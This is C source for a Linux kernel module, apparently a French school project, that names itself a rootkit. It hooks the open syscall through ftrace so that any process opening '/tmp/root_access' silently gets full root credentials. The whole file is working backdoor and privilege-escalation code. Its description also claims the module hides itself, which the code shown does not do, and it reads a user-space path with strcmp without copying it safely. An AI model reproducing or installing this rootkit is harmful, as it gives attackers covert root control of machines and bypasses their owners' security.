#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include "ftrace_helper.h"

//Obliger d'avoir une license GPL car le kernel demande le moins de modules propriétaires possible
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ecole 2600 Groupe 6");
MODULE_DESCRIPTION("Module permettant de masquer un LKM et d'octroyer les privilèges root.");
MODULE_VERSION("0.1");


// Verification de la version du noyau pour déterminer le type d'interface des appels système
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
// Prototype pour l'appel système d'origine 
static asmlinkage long (*orig_open)(const struct pt_regs *);
struct ftrace_hook;
asmlinkage int hook_open(const struct pt_regs *regs);
void set_root(void);

// Fonction hookée remplaçant le syscall open.
asmlinkage int hook_open(const struct pt_regs *regs)
{
    char __user *filename = (char *)regs->di; // Récupération du chemin du fichier demandé

    if (strcmp(filename, "/tmp/root_access") == 0) {
        printk(KERN_INFO "rootkit: Accès root accordé via /tmp/root_access\n");
        set_root(); // Appelle la fonction accordent les privilèges root
        return 0;   // Fichier "ouvert" avec succès
    }

    // Muavais fichier ciblé appeler la fonction système d'origine
    return orig_open(regs);
}

#else
// Prototype pour les noyaux plus anciens (< 4.17).
static asmlinkage long (*orig_open)(const char __user *filename, int flags, mode_t mode);

// Fonction hookée pour les noyaux plus anciens.
static asmlinkage int hook_open(const char __user *filename, int flags, mode_t mode)
{
    void set_root(void);

    if (strcmp(filename, "/tmp/root_access") == 0)
    {
        printk(KERN_INFO "rootkit: Giving root access via open...\n");
        set_root(); // Appelle la fonction accordent les privilèges root
        return 0;  // Fichier "ouvert" avec succès
    }

    return orig_open(filename, flags, mode);
}
#endif

//Fonction de privEsc
void set_root(void)
{
    struct cred *root;

    // Préparation des nouvelles credentials pour le processus
    root = prepare_creds();
    if (root == NULL) {
        printk(KERN_ERR "[-] rootkit: Échec de la préparation des credentials\n");
        return;
    }

    // Élévation des UID et GID à 0 (root).
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    // Application des nouvelles credentials au processus appelant
    commit_creds(root);
}

// Tableau décrivant les hooks à installer.
static struct ftrace_hook hooks[] = {
    // Hook sur la fonction système __x64_sys_open.
    HOOK("__x64_sys_open", hook_open, &orig_open),
};

// Fonction d'initialisation du module.
static int __init rootkit_init(void)
{
    int err;

    // Installation des hooks.
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "[-] rootkit: Échec de l'installation du hooks (%d)\n", err);
        return err;
    }

    printk(KERN_INFO "[+] rootkit: Module chargé avec succès\n");
    return 0;
}

// Fonction de nettoyage du module.
static void __exit rootkit_exit(void)
{
    // Suppression des hooks installés.
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "[+] rootkit: Module déchargé avec succès\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);